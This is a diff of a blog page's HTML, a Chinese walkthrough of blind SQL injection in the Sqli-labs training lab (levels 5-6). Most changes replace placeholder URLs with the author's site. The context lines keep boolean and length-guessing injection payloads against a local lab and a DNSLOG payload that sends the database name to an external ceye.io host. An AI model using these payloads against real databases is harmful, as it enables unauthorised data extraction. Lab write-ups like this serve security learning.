@@ -10,7 +10,7 @@
 <meta name="keywords" content="Sqli-labs">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Sqli-labs Blind injection Less5-6">
-<meta property="og:url" content="http://yoursite.com/2018/10/23/Sqli-labs_Blind_injection_Less5-6/index.html">
+<meta property="og:url" content="https://p0rz9.github.io/2018/10/23/Sqli-labs_Blind_injection_Less5-6/index.html">
 <meta property="og:site_name" content="P0rZ9&#39;s blog">
 <meta property="og:description" content="在Sqli-labs项目中的第5、6关是盲注部分。我们知道盲注中,往往会遇到截取字符串的问题,这种情况下往往需要一个一个字符的去猜解,这里就总结几个过程中会用于截取字符串的函数及在Less5、6中的应用。   ##MID(源字符串,开始位置,截取长度)    str = ‘123456’  mid(str,2,1)结果为2 （下标从1开始）SQL用例：A.MID(DATABASE(),1,1)&amp;">
 <meta property="og:locale" content="default">
@@ -87,16 +87,16 @@
     <br/>
     <div id="share" style="display: none">
       <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/10/23/Sqli-labs_Blind_injection_Less5-6/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/10/23/Sqli-labs_Blind_injection_Less5-6/&text=Sqli-labs Blind injection Less5-6"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/10/23/Sqli-labs_Blind_injection_Less5-6/&title=Sqli-labs Blind injection Less5-6"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/10/23/Sqli-labs_Blind_injection_Less5-6/&is_video=false&description=Sqli-labs Blind injection Less5-6"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=Sqli-labs Blind injection Less5-6&body=Check out this article: http://yoursite.com/2018/10/23/Sqli-labs_Blind_injection_Less5-6/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/10/23/Sqli-labs_Blind_injection_Less5-6/&title=Sqli-labs Blind injection Less5-6"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/10/23/Sqli-labs_Blind_injection_Less5-6/&title=Sqli-labs Blind injection Less5-6"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/10/23/Sqli-labs_Blind_injection_Less5-6/&title=Sqli-labs Blind injection Less5-6"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/10/23/Sqli-labs_Blind_injection_Less5-6/&title=Sqli-labs Blind injection Less5-6"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/10/23/Sqli-labs_Blind_injection_Less5-6/&name=Sqli-labs Blind injection Less5-6&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://p0rz9.github.io/2018/10/23/Sqli-labs_Blind_injection_Less5-6/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://p0rz9.github.io/2018/10/23/Sqli-labs_Blind_injection_Less5-6/&text=Sqli-labs Blind injection Less5-6"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://p0rz9.github.io/2018/10/23/Sqli-labs_Blind_injection_Less5-6/&title=Sqli-labs Blind injection Less5-6"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://p0rz9.github.io/2018/10/23/Sqli-labs_Blind_injection_Less5-6/&is_video=false&description=Sqli-labs Blind injection Less5-6"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Sqli-labs Blind injection Less5-6&body=Check out this article: https://p0rz9.github.io/2018/10/23/Sqli-labs_Blind_injection_Less5-6/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://p0rz9.github.io/2018/10/23/Sqli-labs_Blind_injection_Less5-6/&title=Sqli-labs Blind injection Less5-6"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://p0rz9.github.io/2018/10/23/Sqli-labs_Blind_injection_Less5-6/&title=Sqli-labs Blind injection Less5-6"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://p0rz9.github.io/2018/10/23/Sqli-labs_Blind_injection_Less5-6/&title=Sqli-labs Blind injection Less5-6"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://p0rz9.github.io/2018/10/23/Sqli-labs_Blind_injection_Less5-6/&title=Sqli-labs Blind injection Less5-6"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://p0rz9.github.io/2018/10/23/Sqli-labs_Blind_injection_Less5-6/&name=Sqli-labs Blind injection Less5-6&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
@@ -163,7 +163,7 @@ ord(mid(database(),1,1))=97
 <pre><code>http://127.0.0.1:86/less-5/index.php?id=1&apos; and 1=1--+
 http://127.0.0.1:86/less-5/index.php?id=1&apos; and 1=2--+
 </code></pre><p>这里正确会返回You are in…… 错误返回空</p>
-<p>那么基本可以确定这里是一处盲注了,下面笔者直接给出payload,如果有不熟悉的语句,可参考笔者之前的文章:<a href="https://p0rz9.github.io/2018/10/22/Sqli-labs_Less1-4/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/10/22/Sqli-labs_Less1-4/</a></p>
+<p>那么基本可以确定这里是一处盲注了,下面笔者直接给出payload,如果有不熟悉的语句,可参考笔者之前的文章:<a href="https://p0rz9.github.io/2018/10/22/Sqli-labs_Less1-4/">https://p0rz9.github.io/2018/10/22/Sqli-labs_Less1-4/</a></p>
 <p>猜解数据库长度:</p>
 <pre><code>http://127.0.0.1:86/less-5/index.php?id=1&apos; and length(database())&gt;7--+
 http://127.0.0.1:86/less-5/index.php?id=1&apos; and length(database())&gt;8--+
@@ -370,7 +370,7 @@ print &quot;%s表的%s列的数据:%s&quot;%(table_list[-1],column_list[1],date_
 <pre><code>$sql=&quot;SELECT * FROM users WHERE id=&quot;$id&quot; LIMIT 0,1&quot;;
 </code></pre><p>那我们将Less-5所用payload中的<code>&#39;</code>改为<code>&quot;</code>即可成功利用。</p>
 <p><img src="http://static.zybuluo.com/chhyx/z4iksin5ba3qjblj36bd7srh/image_1cqftpsuureu1uh18071tcl1djp9e.png" alt="image_1cqftpsuureu1uh18071tcl1djp9e.png-54.9kB"></p>
-<p><strong>DNSLOG注入</strong><br>当然这里也可以使用DNSLOG来盲注,不清楚的可以先看看笔者前几天的文章:<br><a href="https://p0rz9.github.io/2018/09/26/%E5%88%A9%E7%94%A8DNSLOG%E5%BF%AB%E9%80%9F%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%28%E7%9B%B2%E6%B3%A8%29/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/26/利用DNSLOG快速获取数据(盲注)</a></p>
+<p><strong>DNSLOG注入</strong><br>当然这里也可以使用DNSLOG来盲注,不清楚的可以先看看笔者前几天的文章:<br><a href="https://p0rz9.github.io/2018/09/26/%E5%88%A9%E7%94%A8DNSLOG%E5%BF%AB%E9%80%9F%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%28%E7%9B%B2%E6%B3%A8%29/">https://p0rz9.github.io/2018/09/26/利用DNSLOG快速获取数据(盲注)</a></p>
 <p>获取数据库名:</p>
 <pre><code>id=1&apos; and if((select load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.xxxxx.ceye.io\\abc&apos;))),1,0)--+
 </code></pre><p>即可在我们的dns平台查看数据库内容:<br><img src="http://static.zybuluo.com/chhyx/6pxiwvjna84pwnrocve6aj8j/image_1cqg1ucob1k9jmbe1emh1iml1nqo9.png" alt="image_1cqg1ucob1k9jmbe1emh1iml1nqo9.png-46.2kB"></p>
@@ -409,16 +409,16 @@ print &quot;%s表的%s列的数据:%s&quot;%(table_list[-1],column_list[1],date_
 
     <div id="share-footer" style="display: none">
       <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/10/23/Sqli-labs_Blind_injection_Less5-6/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/10/23/Sqli-labs_Blind_injection_Less5-6/&text=Sqli-labs Blind injection Less5-6"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/10/23/Sqli-labs_Blind_injection_Less5-6/&title=Sqli-labs Blind injection Less5-6"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/10/23/Sqli-labs_Blind_injection_Less5-6/&is_video=false&description=Sqli-labs Blind injection Less5-6"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=Sqli-labs Blind injection Less5-6&body=Check out this article: http://yoursite.com/2018/10/23/Sqli-labs_Blind_injection_Less5-6/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/10/23/Sqli-labs_Blind_injection_Less5-6/&title=Sqli-labs Blind injection Less5-6"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/10/23/Sqli-labs_Blind_injection_Less5-6/&title=Sqli-labs Blind injection Less5-6"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/10/23/Sqli-labs_Blind_injection_Less5-6/&title=Sqli-labs Blind injection Less5-6"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/10/23/Sqli-labs_Blind_injection_Less5-6/&title=Sqli-labs Blind injection Less5-6"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/10/23/Sqli-labs_Blind_injection_Less5-6/&name=Sqli-labs Blind injection Less5-6&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://p0rz9.github.io/2018/10/23/Sqli-labs_Blind_injection_Less5-6/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://p0rz9.github.io/2018/10/23/Sqli-labs_Blind_injection_Less5-6/&text=Sqli-labs Blind injection Less5-6"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://p0rz9.github.io/2018/10/23/Sqli-labs_Blind_injection_Less5-6/&title=Sqli-labs Blind injection Less5-6"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://p0rz9.github.io/2018/10/23/Sqli-labs_Blind_injection_Less5-6/&is_video=false&description=Sqli-labs Blind injection Less5-6"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Sqli-labs Blind injection Less5-6&body=Check out this article: https://p0rz9.github.io/2018/10/23/Sqli-labs_Blind_injection_Less5-6/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://p0rz9.github.io/2018/10/23/Sqli-labs_Blind_injection_Less5-6/&title=Sqli-labs Blind injection Less5-6"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://p0rz9.github.io/2018/10/23/Sqli-labs_Blind_injection_Less5-6/&title=Sqli-labs Blind injection Less5-6"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://p0rz9.github.io/2018/10/23/Sqli-labs_Blind_injection_Less5-6/&title=Sqli-labs Blind injection Less5-6"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://p0rz9.github.io/2018/10/23/Sqli-labs_Blind_injection_Less5-6/&title=Sqli-labs Blind injection Less5-6"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://p0rz9.github.io/2018/10/23/Sqli-labs_Blind_injection_Less5-6/&name=Sqli-labs Blind injection Less5-6&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
